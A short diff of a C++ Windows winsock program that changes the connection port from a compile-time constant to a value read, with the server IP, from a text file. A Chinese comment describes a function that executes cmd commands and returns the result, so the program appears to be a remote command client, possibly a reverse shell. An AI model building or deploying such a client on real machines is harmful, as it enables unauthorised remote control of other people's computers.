@@ -3,16 +3,16 @@
 #include <winsock2.h>  
 #include<windows.h>
 #include<unistd.h>
-#define PORT 8080
-//#error 请设定服务器IP再编译
 #define  BUFFER_SIZE 4196
 using namespace std;
 const char* kExitFlag = "exit";
 /// 执行cmd指令并返回结果
 char SERVER_IP[256];
+unsigned short PORT=8080;
 void get_ip(){
 	ifstream fin ("connect.txt");
 	fin>>SERVER_IP;
+	fin>>PORT;
 	fin.close();
 }
 string getCmdResult(const char* strCmd)  
